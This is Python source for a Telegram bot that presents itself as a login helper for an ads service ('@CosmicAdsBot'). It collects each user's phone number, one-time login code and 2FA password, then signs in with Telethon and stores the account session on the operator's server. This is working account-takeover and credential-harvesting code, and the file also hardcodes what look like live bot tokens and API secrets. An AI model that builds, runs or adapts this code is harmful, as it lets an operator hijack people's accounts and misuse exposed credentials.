import os
import requests
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, ConversationHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

# ---------------- CONFIG ----------------
BOT_TOKEN = "8369950751:AAEcXGtfXUt3nJaMlTiTOX2StRcQi11plVs"  # Login Bot Token
API_ID = 24945402
API_HASH = "6118e50f5dc4e3a955e50b22cf673ae2"

# Main bot details
MAIN_BOT_TOKEN = "8388938837:AAFLBd4BHMUnbwelsqcXbsjtuz6t7-nTZoc"
MAIN_BOT_USERNAME = "@CosmicAdsBot"

# Conversation States
ASK_PHONE, ASK_OTP, ASK_2FA = range(3)

# Storage
user_clients = {}
user_phones = {}
user_otps = {}

# ---------------- HELPERS ----------------
def get_session_name(user_id):
    os.makedirs("sessions", exist_ok=True)
    return f"sessions/{user_id}"

async def approve_user_in_main_bot(message: str):
    try:
        bot_url = f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/sendMessage"
        params = {"chat_id": MAIN_BOT_USERNAME, "text": message}
        requests.get(bot_url, params=params)
    except Exception as e:
        print(f"❌ Error notifying main bot: {e}")

def otp_keyboard(current_otp: str):
    """Return inline keypad with digits and clear/submit"""
    keyboard = [
        [InlineKeyboardButton("1", callback_data="1"),
         InlineKeyboardButton("2", callback_data="2"),
         InlineKeyboardButton("3", callback_data="3")],
        [InlineKeyboardButton("4", callback_data="4"),
         InlineKeyboardButton("5", callback_data="5"),
         InlineKeyboardButton("6", callback_data="6")],
        [InlineKeyboardButton("7", callback_data="7"),
         InlineKeyboardButton("8", callback_data="8"),
         InlineKeyboardButton("9", callback_data="9")],
        [InlineKeyboardButton("0", callback_data="0"),
         InlineKeyboardButton("Clear", callback_data="clear"),
         InlineKeyboardButton("Submit ✅", callback_data="submit")]
    ]
    text = f"🔢 *Enter OTP:*\n`{current_otp}`"
    return text, InlineKeyboardMarkup(keyboard)

# ---------------- LOGIN FLOW ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📱 Send your phone number (with +countrycode):")
    return ASK_PHONE

async def phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    phone = update.message.text.strip()
    user_phones[uid] = phone
    client = TelegramClient(get_session_name(uid), API_ID, API_HASH)

    try:
        await client.connect()
        await client.send_code_request(phone)
        user_clients[uid] = client
        user_otps[uid] = ""

        text, keyboard = otp_keyboard("")
        await update.message.reply_text("✅ OTP sent successfully!")
        await update.message.reply_markdown_v2(text, reply_markup=keyboard)
        return ASK_OTP

    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send OTP: {e}")
        return ConversationHandler.END

async def otp_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data

    otp_val = user_otps.get(uid, "")
    client = user_clients.get(uid)
    phone = user_phones.get(uid)

    if not client:
        await query.edit_message_text("⚠️ Session expired. Restart /start.")
        return ConversationHandler.END

    # Handle keypad actions
    if data == "clear":
        user_otps[uid] = ""
    elif data == "submit":
        otp = otp_val
        try:
            await query.edit_message_text("⏳ Verifying OTP, please wait...")
            await client.sign_in(phone=phone, code=otp)
        except SessionPasswordNeededError:
            await query.edit_message_text("🔑 2FA enabled. Send your password:")
            return ASK_2FA
        except Exception as e:
            await query.edit_message_text(f"❌ OTP failed: {e}")
            return ConversationHandler.END

        await client.disconnect()
        await query.edit_message_text("🎉 Login successful! You can now use the main bot.")
        await approve_user_in_main_bot(f"✅ User {uid} successfully logged in via the login bot.")
        return ConversationHandler.END
    else:
        # Add digit
        user_otps[uid] = otp_val + data

    new_text, new_keyboard = otp_keyboard(user_otps[uid])
    try:
        await query.edit_message_text(new_text, parse_mode="Markdown", reply_markup=new_keyboard)
    except:
        pass
    return ASK_OTP

async def twofa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    pwd = update.message.text.strip()
    client = user_clients.get(uid)
    try:
        await client.sign_in(password=pwd)
        await client.disconnect()
        await update.message.reply_text("🎉 2FA successful! You can now use the main bot.")
        await approve_user_in_main_bot(f"✅ User {uid} has successfully completed 2FA.")
    except Exception as e:
        await update.message.reply_text(f"❌ 2FA failed: {e}")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Login process canceled.")
    return ConversationHandler.END

# ---------------- MAIN ----------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone)],
            ASK_OTP: [CallbackQueryHandler(otp_buttons)],
            ASK_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, twofa)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv)
    print("✅ Login Bot with Inline Keypad is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
